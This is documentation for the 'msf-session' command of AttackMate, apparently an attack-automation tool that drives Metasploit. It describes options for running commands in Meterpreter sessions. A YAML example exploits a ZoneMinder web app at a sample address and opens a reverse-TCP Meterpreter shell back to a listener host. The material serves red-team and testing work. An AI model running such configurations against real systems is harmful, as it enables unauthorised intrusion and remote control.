.. _msf-session:

===========
msf-session
===========

Execute commands in an active Meterpreter session previously opened by an
:ref:`msf-module` command.

.. note::

   To configure the connection to ``msfrpcd``, see :ref:`msf_config`.

.. code-block:: yaml

      commands:
        # First, exploit a vulnerability and create a session:
        - type: msf-module
          cmd: exploit/unix/webapp/zoneminder_snapshots
          creates_session: foothold
          options:
            RHOSTS: 192.42.0.254
          payload: cmd/unix/python/meterpreter/reverse_tcp
          payload_options:
            LHOST: 192.42.2.253

        # Then, execute a command in the session:
        - type: msf-session
          session: foothold
          stdapi: True
          cmd: getuid


.. confval:: session

   Name of the session to operate in. Must have been created previously by an
   :ref:`msf-module` command using :confval:`creates_session`.

   :type: str
   :required: True


.. confval:: cmd

   Command to execute in the session.

   :type: str


.. confval:: stdapi

   Load the stdapi extension in the Meterpreter session before executing the command.
   Required for many standard Meterpreter commands.

   :type: bool
   :default: ``False``

.. confval:: write

   Execute a raw write-operation to the session without reading the output.

   .. note::

      If both ``write`` and ``read`` are ``True``, AttackMate will first write and then read.

   :type: bool
   :default: ``False``

.. confval:: read

   Execute a raw read-operation from the session without a preceding write-operation.

   :type: bool
   :default: ``False``

.. confval:: end_str

   String indicating the end of a read-operation.

   :type: str
